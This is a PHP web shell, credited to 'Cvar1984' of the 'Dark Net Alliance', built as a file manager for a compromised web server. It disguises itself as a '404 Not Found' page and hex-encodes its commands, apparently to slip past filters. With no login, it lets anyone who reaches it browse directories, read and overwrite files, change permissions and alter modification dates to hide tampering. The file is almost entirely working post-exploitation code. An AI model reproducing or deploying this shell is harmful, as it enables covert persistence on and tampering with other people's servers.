<?php
/*
                    O       o O       o O       o
                    | O   o | | O   o | | O   o |
                    | | O | | | | O | | | | O | |
                    | o   O | | o   O | | o   O |
                    o       O o       O o       O
                                { Dark Net Alliance }
              -----------------------------------------
              Copyright (C) 2022  Cvar1984
              This program is free software: you can redistribute it and/or modify
              it under the terms of the GNU General Public License as published by
              the Free Software Foundation, either version 3 of the License, or
              (at your option) any later version.
              This program is distributed in the hope that it will be useful,
              but WITHOUT ANY WARRANTY; without even the implied warranty of
              MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
              GNU General Public License for more details.
              You should have received a copy of the GNU General Public License
              along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
function getDirectoryContents($dir)
{
    $dirs = scandir($dir);
    $results = array();
    foreach ($dirs as $content) {
        if (is_file($content)) {
            $results['files'][] = $content;
        } elseif (is_dir($content)) {
            $results['dirs'][] = $content;
        } elseif (is_link($content)) {
            $results['dirs'][] = $content;
        }
    }
    return $results;
}
function getOperatingSystem()
{
    $os = strtolower(substr(PHP_OS, 0, 5));
    switch ($os) {
        case 'linux':
            break;
        case 'windo':
            $os = 'windows';
            break;
    }
    return $os;
}
function getFilePermission($file)
{
    return substr(sprintf('%o', fileperms($file)), -4);
}
function editFile($file)
{
    ?>
    <form method="post" id="form_edit" onsubmit="eno(document.getElementById('content').value);">
        <div class="row">
            <h3>Edit File</h3>
            <label>Filename : <?php echo $file;?></label>
            <textarea class="u-full-width u-full-height" id='content' name="content"><?php echo htmlspecialchars(readFileContents($file));?></textarea>
            <input class="button-primary" type="submit" name="submit" value="save">
            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
            <input type="hidden" name="actions" value="<?php echo bin2hex("save_file");?>">
        </div>
    </form>
    <script>
                function bin2hex(s) {
            // utf8 to latin1
            var s = unescape(encodeURIComponent(s))
            var h = ''
            for (var i = 0; i < s.length; i++) {
                h += s.charCodeAt(i).toString(16)
            }
            return h
        }
        function eno(a) {
		document.getElementById('content').value = bin2hex(a);
        document.getElementById('form_edit').submit();
	}
    </script>
    <?php
    exit;
}
function filePermission($file)
{
    // Code
    ?>
    <form method="post">
        <div class="row">
            <h3>Change Mode</h3>
            <label>Filename : <?php echo $file;?></label>
            <input class="u-full-width" type="text" name="file" value="<?php echo getFilePermission($file) ?>">
            <input class="button-primary" type="submit" name="submit" value="change">
            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
            <input type="hidden" name="actions" value="<?php echo bin2hex("chmod");?>">
        </div>
    </form>
    <?php
    exit;
}

function fileChangedate($file)
{
    // Code
    ?>
    <form method="post">
        <div class="row">
            <h3>Change Date</h3>
            <label>Filename : <?php echo $file ?></label>
            <input class="u-full-width" type="text" name="file" value="<?php echo fileDate($file) ?>">
            <input class="button-primary" type="submit" name="submit" value="change">
            <input type="hidden" name="path" value="<?php echo bin2hex($file);?>">
            <input type="hidden" name="actions" value="<?php echo bin2hex("touch");?>">
        </div>
    </form>
    <?php
    exit;
}

function getOwnership($filename)
{

    if (!function_exists('stat')) {
        $group = '????';
        $user = '????';
        return compact('user', 'group');
    }
    $stat = stat($filename);
    if (function_exists('posix_getgrgid')) {
        $group = posix_getgrgid($stat[5])['name'];
    } else {
        $group = $stat[5];
    }
    if (function_exists('posix_getpwuid')) {
        $user = posix_getpwuid($stat[4])['name'];
    } else {
        $user = $stat[4];
    }
    return compact('user', 'group');
}
function getFileColor($file)
{
    if(is_writable($file)) {
        return 'lime';
    } elseif(is_readable($file)) {
        return 'gray';
    } else {
        return 'red';
    }
}
function fileDate($file)
{
    return date("D, d M Y H:i:s O", filemtime($file));
}

function xorString($input, $key)
{
    $textLen = strlen($input);

    for ($x = 0; $x < $textLen; $x++) {
        $input[$x] = ($input[$x] ^ $key);
    }
    return $input;
}
function readFileContents($file)
{
    if (function_exists('file_get_contents')) {
        return file_get_contents($file);
    } elseif (function_exists('fopen')) {
        $fstream = fopen($file, 'r');
        if (!$fstream) {
            //fclose($fstream);
            return false;
        }
        $content = fread($fstream, filesize($file));
        fclose($fstream);
        return $content;
    }
}
function writeFileContents($filename, $content)
{
    if(!is_writable($filename)) {
        return false; // not writable
    }
    if (function_exists('file_put_contents')) {
        return file_put_contents($filename, $content);
    } elseif (function_exists('fopen')) {
        $handle = fopen($filename, 'wb');
        fwrite($handle, $content);
        fclose($handle);
        return true;
    }
    return false; // all function disabled
}
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <!-- Basic Page Needs
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <meta name="author" content="Cvar1984">
    <meta name="robots" content="noindex, nofollow">

    <!-- Mobile Specific Metas
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSS
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
    <link rel="stylesheet" href="https://raw.githubusercontent.com/dhg/Skeleton/gh-pages/dist/css/normalize.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" integrity="sha512-EZLkOqwILORob+p0BXZc+Vm3RgJBOe1Iq/0fiI7r/wJgzOFZMlsqTa29UEl6v6U6gsV4uIpsNZoV32YZqrCRCQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        a {color:black;}
        a:link {text-decoration: none;}
        a:visited {text-decoration: none;}
        a:hover {text-decoration: none;}
        a:active {text-decoration: none;}
        .icon_folder {
            vertical-align: middle;
            width: 25px;
            height: 25px;
            content:url('https://i.postimg.cc/W4WynX8V/folder-icon.png');
        }
        .icon_file {
            vertical-align: middle;
            width: 25px;
            height: 25px;
            content:url('https://i.postimg.cc/T3THvZHG/Documents-icon.png');
        }
        textarea {resize: none;}
        textarea.u-full-height {
            height: 50vh;
        }
        td.files {
            cursor: pointer;
        }
    </style>
</head>

<body>
<?php
    if (isset($_POST['actions'])) {
        $actions = $_POST['actions'];
        $actions = hex2bin($actions);
        switch ($actions) {
            case 'open_file':
                editFile(hex2bin($_POST['path']));
                break;
            case 'save_file':
                if (!writeFileContents(hex2bin($_POST['path']), hex2bin($_POST['content']))) {
                    echo "failed";
                }
                echo 'success';
                break;
            case 'open_dir':
            if (!isset($_POST['path'])) {
                $_POST['path'] = bin2hex(getcwd());
            }
            chdir(hex2bin($_POST['path']));
            break;
            case 'chmod':
                filePermission(hex2bin($_POST['path']));
                break;
            case 'touch':
                fileChangedate(hex2bin($_POST['path']));
                break;
        }
    }
    ?>
    <script>
        function bin2hex(s) {
            // utf8 to latin1
            var s = unescape(encodeURIComponent(s))
            var h = ''
            for (var i = 0; i < s.length; i++) {
                h += s.charCodeAt(i).toString(16)
            }
            return h
        }

        function hex2bin(h) {
            var s = ''
            for (var i = 0; i < h.length; i += 2) {
                s += String.fromCharCode(parseInt(h.substr(i, 2), 16))
            }
            return decodeURIComponent(escape(s))
        }

        function cd(path) {
            document.getElementById('actions').value = bin2hex("open_dir");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function vi(path) {
            document.getElementById('actions').value = bin2hex("open_file");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function chmod(path) {
            document.getElementById('actions').value = bin2hex("chmod");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function touch(path) {
            document.getElementById('actions').value = bin2hex("touch");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function rm(path) {
            document.getElementById('actions').value = bin2hex("rm");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }
    </script>

    <table class="u-full-width">
        <thead>
            <tr>
                <th>Name</th>
                <th>Date Modified</th>
                <th>Ownership</th>
                <th>Permission</th>
            </tr>
        </thead>
        <tbody>
            <?php $contents = getDirectoryContents(getcwd());

            if (isset($contents['dirs'])) {
                foreach ($contents['dirs'] as $dirName) {
                    $path = realpath($dirName);
                    $path = str_replace('\\', '/', $path);
                    $path = $path;
                    $perm = getFilePermission($path);
                    $date = fileDate($path);
                    $ownership = getOwnership($path);
                    $user = $ownership['user'];
                    $group = $ownership['group'];
                    $color = getFileColor($path);
                    echo "<tr>
                            <td class='files' onclick='cd(\"{$path}\");'>
                            <img class='icon_folder' /><a href='javascript:cd(\"{$path}\");'>&nbsp;{$dirName}</a></td>
                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
                            <td>{$user}:{$group}</td>
                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
                        </tr>";
                }
            }
            if (isset($contents['files'])) {
                foreach ($contents['files'] as $fileName) {
                    $path = realpath($fileName);
                    $path = str_replace('\\', '/', $path);
                    $perm = getFilePermission($path);
                    $date = fileDate($path);
                    $ownership = getOwnership($path);
                    $user = $ownership['user'];
                    $group = $ownership['group'];
                    $color = getFileColor($path);
                    echo "<tr>
                            <td class='files' onclick='vi(\"{$path}\");'>
                            <img class='icon_file' /><a href='javascript:vi(\"{$path}\");'>&nbsp{$fileName}<a/></td>
                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
                            <td>{$user}:{$group}</td>
                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
                        </tr>";
                }
            } ?>
        </tbody>
    </table>
    <?php print_r($_POST); ?>
    <form id="action_container" method="POST">
        <input type="hidden" id="path" name="path" />
        <input type="hidden" id="actions" name="actions" />
    </form>
</body>

</html>